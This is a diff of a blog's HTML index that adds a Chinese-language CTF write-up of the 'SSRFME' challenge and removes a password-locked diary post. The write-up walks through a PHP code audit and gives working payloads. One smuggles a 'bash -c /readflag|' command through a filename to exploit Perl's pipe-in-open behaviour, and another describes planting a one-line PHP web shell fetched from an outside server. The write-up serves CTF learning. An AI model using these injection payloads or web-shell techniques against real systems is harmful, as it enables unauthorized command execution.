@@ -267,6 +267,133 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-HNCTF-SSRFME" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2024/02/01/HNCTF-SSRFME/" class="article-date">
+      <time datetime="2024-01-31T16:31:16.000Z" itemprop="datePublished">2024-02-01</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2024/02/01/HNCTF-SSRFME/">HNCTF-SSRFME</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="hnctf2017-ssrfme"><a class="markdownIt-Anchor" href="#hnctf2017-ssrfme">#</a> HNCTF2017  SSRFME</h2>
+<p>今天深度剖析一下 SSRFme 这道题目<br>
+<img src="https://img-blog.csdnimg.cn/direct/0f54478b191340d98b6b0e9c25109bf0.png" alt="在这里插入图片描述"></p>
+<p><strong>拿道题目从上往下的代码审计进行分析</strong></p>
+<p>第一部分：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$http_x_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br></pre></td></tr></table></figure>
+<p>功能：<br>
+1.$_SERVER 的功能是接受一个参数，这里是在 X-FORWARD 里面</p>
+<blockquote>
+<p>在首行代码中，explode (’,’, $_SERVER [‘HTTP_X_FORWARDED_FOR’]) 使用逗号 (,) 作为分隔符将字符串分割成数组。因为这个头部允许包含多个 IP 地址，其中最左边的 IP 地址是最初的客户端 IP。</p>
+</blockquote>
+<p>第二部分：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sandbox</span>;</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br></pre></td></tr></table></figure>
+<p>功能：<br>
+1.sandbox 变量是由 sandbox 加上（orange + 上文的地址赋值）</p>
+<blockquote>
+<p>举例说明： 赋值 127.0.0.1 加密后为 cfbb870b58817bf7705c0bd826e8dba7。<br>
+组合后就是<br>
+ sandbox/cfbb870b58817bf7705c0bd826e8dba7</p>
+</blockquote>
+<p>2.mkdir 创建文件夹<br>
+ 3.chdir 更改当前目录到文件夹</p>
+<p>第三部分：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">   <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">   <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));</span><br></pre></td></tr></table></figure>
+<p>功能:<br>
+1. <code>$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</code> <br>
+ 这里有一个重点 perl 脚本 GET 的使用，可以直接查询目录，和正常指令一样<br>
+<img src="https://img-blog.csdnimg.cn/direct/8e736f1671164031817ec698e104c05d.png" alt="在这里插入图片描述"><br>
+ 2.Pathinfo () 函数作用</p>
+<blockquote>
+<pre><code>可以通过以下方式访问 `pathinfo()` 返回的关联数组中的不同信息：
+</code></pre>
+<ul>
+<li><code>$info['dirname']</code> ：返回文件所在目录的路径。</li>
+<li><code>$info['basename']</code> ：返回文件的完整基本名称（包含文件名和扩展名）。</li>
+<li><code>$info['extension']</code> ：返回文件的扩展名。</li>
+<li><code>$info['filename']</code> ：返回文件的名称（不包含扩展名）。   ```</li>
+</ul>
+</blockquote>
+<p>3.str_replace 的把点换成空格</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">@<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>在当前目录就是 sandbox/cfbb870b58817bf7705c0bd826e8dba7 文件夹建立文件名不要拓展名<br>
+回到本题，</p>
+<h2 id="方法一perl命令读取"><a class="markdownIt-Anchor" href="#方法一perl命令读取">#</a> 方法一：perl 命令读取</h2>
+<p>我们可以尝试 GET / 读取根目录</p>
+<p><code>?url= /&amp;filename=666.txt</code> <br>
+ 访问一下：<br>
+/sandbox/fcf2bccafc269c160382150a0166d632/666.txt<br>
+ 在当前目录就建立了以 data 数据内容的一个个目录<br>
+再看到<br>
+<img src="https://img-blog.csdnimg.cn/direct/14fbc2d0603d498ebf49b33e7381c7f0.png" alt="在这里插入图片描述"><br>
+可以看到根目录，那怎么读取，先尝试<br>
+ <code>url=/flag&amp;filename=6667.txt</code>  读取是空白，再看 readflag，是乱码二进制数据很明显就是要我们运行，那这里就要用到 file 配合。</p>
+<blockquote>
+<p>主要的知识点：perl 函数看到要打开的文件名中如果以管道符（键盘上那个竖杠 |）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到 perl 程序运行的结果。</p>
+</blockquote>
+<p>针对 GET 命令，使用 file: 来搭配读取文件</p>
+<blockquote>
+<p>而想执行 readflag 文件，仅仅是使用 file: 是不够的，还需要使用 Linux 下的命令执行：bash -c 首先得满足前面的文件存在，<br>
+ 才会继续到 open 语句，所以在执行命令前得保证有相应的同名文件:</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=&amp;filename=bash <span class="literal">-c</span> /readflag|</span><br></pre></td></tr></table></figure>
+<p>先新建一个名为 “bash -c /readflag|” 的文件，用于之后的命令执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:bash <span class="literal">-c</span> /readflag|&amp;filename=aaa</span><br></pre></td></tr></table></figure>
+<p>这就拿到 fkag 了<br>
+<img src="https://img-blog.csdnimg.cn/direct/84e08f376f74413b8fec7dee88b3e736.png" alt="在这里插入图片描述"></p>
+<h2 id="方法二vps写入"><a class="markdownIt-Anchor" href="#方法二vps写入">#</a> 方法二：vps 写入</h2>
+<p>get 访问自己服务器上的文件写入木马即可之后用一句话木马，但执行要用<br>
+ <code>cmd=system('bash -c /readflag');</code> <br>
+<img src="https://img-blog.csdnimg.cn/direct/fba9dc5d9d6b466ab256ab5dc3d1fc02.png" alt="在这里插入图片描述"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-Day by Day" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1450,68 +1577,6 @@
       
         <p class="article-more-link">
           <a   href="/2023/08/16/August-13/#more">查看更多 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-August-12" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2023/08/13/August-12/" class="article-date">
-      <time datetime="2023-08-13T15:11:43.000Z" itemprop="datePublished">2023-08-13</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2023/08/13/August-12/">August-12</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              我的秘密都藏起来了，请输入密码查看
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-        <p class="article-more-link">
-          <a   href="/2023/08/13/August-12/#more">查看更多 >></a>
         </p>
       
       <div class="clearfix"></div>
